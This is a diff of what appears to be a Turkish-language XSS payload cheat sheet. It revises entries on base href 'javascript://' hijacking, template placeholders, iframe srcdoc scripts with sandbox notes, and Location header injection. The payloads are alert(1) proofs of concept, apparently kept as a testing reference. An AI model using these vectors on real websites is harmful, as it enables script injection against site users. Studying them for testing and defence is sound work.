@@ -33,14 +33,16 @@ javascript:alert(1)"
 <h4>Eğer base href="..." elementi kontrol ediliyorsa.</h4><br>
 
 📌 Örnek:  
-`<button onclick="PAYLOAD">Click me</button>`  
+```
+<base href="javascript://">
+<a href="/x">Click</a>
+```  
 <br>
 🎯 Exploit:  
+
 ```html
-" onclick=alert(1) x="
-```  
-```js
-alert(1)
+<base href="javascript://">
+<a href="/alert(1)">Click</a>
 ``` 
 <br>
 
@@ -51,7 +53,7 @@ alert(1)
 📌 Örnek:  
 ```html
 <script type="text/template">
-  Hello {{user}}
+  Hello {{PAYLOAD}}
 </script>
 ```
 <br>
@@ -90,6 +92,7 @@ veya
 ```html
 #<iframe srcdoc="<script>alert(1)</script>" sandbox="allow-scripts">
 ```
+srcdoc payload’larında sandbox="allow-scripts" olmazsa script çalışmaz.  
 <br>
 
 
@@ -102,8 +105,9 @@ veya
 <br>
 🎯 Exploit:  
 ```html
-<iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>"></iframe>
+<script>alert(1)</script>
 ```
+srcdoc payload’larında sandbox="allow-scripts" olmazsa script çalışmaz.  
 <br>
 
 
@@ -112,7 +116,7 @@ veya
 <h4>Bazı XSS'ler response header içeriğiyle tetiklenir.</h4><br>
 
 📌 Örnek:  
-`Location: "PAYLOAD"`
+`Location: PAYLOAD`
 <br>  
 🎯 Exploit:  
 ```html
